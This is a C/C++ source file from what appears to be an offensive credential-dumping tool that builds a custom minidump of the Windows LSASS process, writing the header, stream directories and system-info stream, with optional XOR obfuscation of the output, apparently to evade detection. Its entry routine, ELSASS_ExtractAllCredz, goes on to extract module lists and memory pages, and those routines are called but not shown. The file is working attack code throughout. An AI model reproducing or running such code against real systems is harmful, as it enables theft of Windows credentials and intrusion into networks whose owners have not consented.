#include <stdio.h>
#include <iostream>

#include "AxiomDumper.h"
#include "Typedefs.h"
#include "autoxor.h"
#include "ElSass.h"

#define intAlloc(size) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size)
#define intFree(addr) HeapFree(GetProcessHeap(), 0, addr)
#ifdef _WIN64
#define CID_OFFSET 0x40
#define TEB_OFFSET 0x30
#define PEB_OFFSET 0x60
#define READ_MEMLOC __readgsqword
#else
#define CID_OFFSET 0x20
#define TEB_OFFSET 0x18
#define PEB_OFFSET 0x30
#define READ_MEMLOC __readfsdword
#endif

static BOOL ELSASS_ExtractHeader(PDUMPCONTEXT dc)
{
	DumpHeader header;
	DWORD offset = 0;
	char header_bytes[SIZE_OF_HEADER] = { 0 };

	memset(&header, 0, sizeof(DumpHeader));
	header.Signature = dc->Signature;
	header.Version = dc->Version;
	header.ImplementationVersion = dc->ImplementationVersion;
	header.NumberOfStreams = 3;
	header.StreamDirectoryRva = SIZE_OF_HEADER;
	header.CheckSum = 0;
	header.Reserved = 0;
	header.TimeDateStamp = 0;
	header.Flags = 0x00; //MiniDumpNormal;

	memcpy(header_bytes + offset, &header.Signature, 4); offset += 4;
	memcpy(header_bytes + offset, &header.Version, 2); offset += 2;
	memcpy(header_bytes + offset, &header.ImplementationVersion, 2); offset += 2;
	memcpy(header_bytes + offset, &header.NumberOfStreams, 4); offset += 4;
	memcpy(header_bytes + offset, &header.StreamDirectoryRva, 4); offset += 4;
	memcpy(header_bytes + offset, &header.CheckSum, 4); offset += 4;
	memcpy(header_bytes + offset, &header.Reserved, 4); offset += 4;
	memcpy(header_bytes + offset, &header.TimeDateStamp, 4); offset += 4;
	memcpy(header_bytes + offset, &header.Flags, 4);

	ELSASS_Append(dc, header_bytes, SIZE_OF_HEADER, 0x00);

	//printf("[DEBUG] Header parsed\n");

	return (true);
}

static void ELSASS_ExtractDirectories(PDUMPCONTEXT dc)
{
	DUMPDIRECTORY system_info_directory;
	BYTE directory_bytes[SIZE_OF_DIRECTORY] = { 0 };
	DWORD offset;

	memset(&system_info_directory, 0, sizeof(DUMPDIRECTORY));
	system_info_directory.StreamType = 0x7; //SystemInfoStream
	system_info_directory.DataSize = 0;
	system_info_directory.Rva = 0;
	offset = 0;
	memset(directory_bytes, 0, sizeof(directory_bytes));
	memcpy(directory_bytes + offset, &system_info_directory.StreamType, 4); offset += 4;
	memcpy(directory_bytes + offset, &system_info_directory.DataSize, 4); offset += 4;
	memcpy(directory_bytes + offset, &system_info_directory.Rva, 4);
	ELSASS_Append(dc, directory_bytes, sizeof(directory_bytes), 0x00);

	DUMPDIRECTORY module_list_directory;
	memset(&module_list_directory, 0, sizeof(DUMPDIRECTORY));
	module_list_directory.StreamType = 0x4; //ModuleListStream
	module_list_directory.DataSize = 0;
	module_list_directory.Rva = 0;
	offset = 0;
	memset(directory_bytes, 0, sizeof(directory_bytes));
	memcpy(directory_bytes + offset, &module_list_directory.StreamType, 4); offset += 4;
	memcpy(directory_bytes + offset, &module_list_directory.DataSize, 4); offset += 4;
	memcpy(directory_bytes + offset, &module_list_directory.Rva, 4);
	ELSASS_Append(dc, directory_bytes, sizeof(directory_bytes), 0x00);

	DUMPDIRECTORY memory64_list_directory;
	memset(&memory64_list_directory, 0, sizeof(DUMPDIRECTORY));
	memory64_list_directory.StreamType = 0x9; //Memory64ListStream
	memory64_list_directory.DataSize = 0;
	memory64_list_directory.Rva = 0;
	offset = 0;
	memset(directory_bytes, 0, sizeof(directory_bytes));
	memcpy(directory_bytes + offset, &memory64_list_directory.StreamType, 4); offset += 4;
	memcpy(directory_bytes + offset, &memory64_list_directory.DataSize, 4); offset += 4;
	memcpy(directory_bytes + offset, &memory64_list_directory.Rva, 4);
	ELSASS_Append(dc, directory_bytes, sizeof(directory_bytes), 0x00);
}

BOOL ELSASS_ExtractSystemInfo(PDUMPCONTEXT dc)
{
	DUMPSYSTEMINFO system_info;

	//printf("[DEBUG] Parsing SystemInfo streams (3)\n");

	PVOID pPeb;
	PULONG32 OSMajorVersion;
	PULONG32 OSMinorVersion;
	PUSHORT OSBuildNumber;
	PULONG32 OSPlatformId;
	PUNICODE_STRING CSDVersion;
	memset(&system_info, 0, sizeof(DUMPSYSTEMINFO));
	pPeb = (PVOID)READ_MEMLOC(PEB_OFFSET);
	OSMajorVersion = RVA(PULONG32, pPeb, OSMAJORVERSION_OFFSET);
	OSMinorVersion = RVA(PULONG32, pPeb, OSMINORVERSION_OFFSET);
	OSBuildNumber = RVA(PUSHORT, pPeb, OSBUILDNUMBER_OFFSET);
	OSPlatformId = RVA(PULONG32, pPeb, OSPLATFORMID_OFFSET);
	CSDVersion = RVA(PUNICODE_STRING, pPeb, CSDVERSION_OFFSET);
	system_info.ProcessorArchitecture = PROCESSOR_ARCHITECTURE;
	//printf("[DEBUG] OSMajorVersion: %d\n", *OSMajorVersion);
	//printf("[DEBUG] OSMinorVersion: %d\n", *OSMinorVersion);
	//printf("[DEBUG] OSBuildNumber: %d\n", *OSBuildNumber);
	//printf("[DEBUG] CSDVersion: %ls\n", CSDVersion->Buffer);

	system_info.ProcessorLevel = 0;
	system_info.ProcessorRevision = 0;
	system_info.NumberOfProcessors = 0;
	// RtlGetVersion -> wProductType
	system_info.ProductType = VER_NT_WORKSTATION;
	//system_info.ProductType = VER_NT_DOMAIN_CONTROLLER;
	//system_info.ProductType = VER_NT_SERVER;
	system_info.MajorVersion = *OSMajorVersion;
	system_info.MinorVersion = *OSMinorVersion;
	system_info.BuildNumber = *OSBuildNumber;
	system_info.PlatformId = *OSPlatformId;
	system_info.CSDVersionRva = 0;
	system_info.SuiteMask = 0;
	system_info.Reserved2 = 0;
	system_info.ProcessorFeatures1 = 0;
	system_info.ProcessorFeatures2 = 0;

	ULONG32 stream_size = SIZE_OF_SYSTEM_INFO_STREAM;
	char system_info_bytes[SIZE_OF_SYSTEM_INFO_STREAM] = { 0 };

	DWORD offset = 0;
	memcpy(system_info_bytes + offset, &system_info.ProcessorArchitecture, 2); offset += 2;
	memcpy(system_info_bytes + offset, &system_info.ProcessorLevel, 2); offset += 2;
	memcpy(system_info_bytes + offset, &system_info.ProcessorRevision, 2); offset += 2;
	memcpy(system_info_bytes + offset, &system_info.NumberOfProcessors, 1); offset += 1;
	memcpy(system_info_bytes + offset, &system_info.ProductType, 1); offset += 1;
	memcpy(system_info_bytes + offset, &system_info.MajorVersion, 4); offset += 4;
	memcpy(system_info_bytes + offset, &system_info.MinorVersion, 4); offset += 4;
	memcpy(system_info_bytes + offset, &system_info.BuildNumber, 4); offset += 4;
	memcpy(system_info_bytes + offset, &system_info.PlatformId, 4); offset += 4;
	memcpy(system_info_bytes + offset, &system_info.CSDVersionRva, 4); offset += 4;
	memcpy(system_info_bytes + offset, &system_info.SuiteMask, 2); offset += 2;
	memcpy(system_info_bytes + offset, &system_info.Reserved2, 2); offset += 2;
	memcpy(system_info_bytes + offset, &system_info.ProcessorFeatures1, 8); offset += 8;
	memcpy(system_info_bytes + offset, &system_info.ProcessorFeatures2, 8);

	ULONG32 stream_rva = dc->rva;
	ELSASS_Append(dc, system_info_bytes, stream_size, 0x00);
	ELSASS_Writeat(dc, SIZE_OF_HEADER + 4, &stream_size, 4, 0x00);
	ELSASS_Writeat(dc, SIZE_OF_HEADER + 4 + 4, &stream_rva, 4, 0x00);

	ULONG32 sp_rva = dc->rva;
	ULONG32 Length = CSDVersion->Length;
	ELSASS_Append(dc, &Length, 4, 0x00);
	ELSASS_Append(dc, CSDVersion->Buffer, CSDVersion->Length, 0x00);
	ELSASS_Writeat(dc, stream_rva + 24, &sp_rva, 4, 0x00);

	return (TRUE);
}

void ELSASS_Writeat(
    IN PDUMPCONTEXT dc,
    IN ULONG32 rva,
    IN const PVOID data,
    IN unsigned size,
    IN UINT xorkey)
{
	PVOID dst = RVA(PVOID, dc->BaseAddress, rva);
	memcpy(dst, data, size);
	if (xorkey != 0)
	{
		for (size_t i = 0; i < size; i++) {
			*((unsigned char*)dst + i) ^= xorkey;
		}
	}
	//WHY. THE. FUCK. does it crash when I zero-out the buffer ????
	//If you know, please contact me with the answer, it does not make any sense, JFC
	//memset(data, 0, size);
}

void ELSASS_Append(
    IN PDUMPCONTEXT dc,
    IN const PVOID data,
    IN ULONG32 size,
    IN UINT xorkey)
{
	ULONG32 new_rva = dc->rva + size;
	if (new_rva < dc->rva)
	{
		printf("[FAILURE] Bruh\n");
	}
	else if (new_rva >= dc->DumpMaxSize)
	{
		printf("[FAILURE] Extracted bytes overflow destination buffer\n");
	}
	else
	{
		ELSASS_Writeat(dc, dc->rva, data, size, xorkey);
		dc->rva = new_rva;
	}
}

BOOL ELSASS_ExtractAllCredz(PDUMPCONTEXT dc)
{
	PC_MODULEINFO module_list;

	//printf("[DEBUG] All snapshots prerequisites ok, extracting memory...\n");
	ELSASS_ExtractHeader(dc);
	ELSASS_ExtractDirectories(dc);
	ELSASS_ExtractSystemInfo(dc);

	module_list = ELSASS_ExtractModulesList(dc);
	if (!module_list)
		return (false);

	return (!!ELSASS_ExtractMemoryPages(dc, module_list));
}

